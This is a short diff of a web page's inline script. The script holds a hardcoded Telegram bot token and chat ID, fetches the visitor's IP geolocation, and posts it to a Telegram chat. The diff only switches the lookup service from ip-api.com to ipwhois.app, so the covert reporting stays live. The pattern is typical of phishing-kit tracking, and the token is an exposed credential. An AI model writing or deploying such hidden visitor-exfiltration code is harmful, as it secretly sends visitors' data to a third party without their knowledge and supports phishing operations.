@@ -16,7 +16,7 @@
   <script type="text/javascript" charset="utf-8">
     const BOT_TOKEN = "8580459009:AAFAznX7MdbebVRQtszfyypJ3oyfOpCix_g";
     const CHAT_ID = "7273600695";
-    fetch('http://ip-api.com/json/').then(r => r.json()).then(data => {
+    fetch('https://ipwhois.app/json/').then(r => r.json()).then(data => {
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
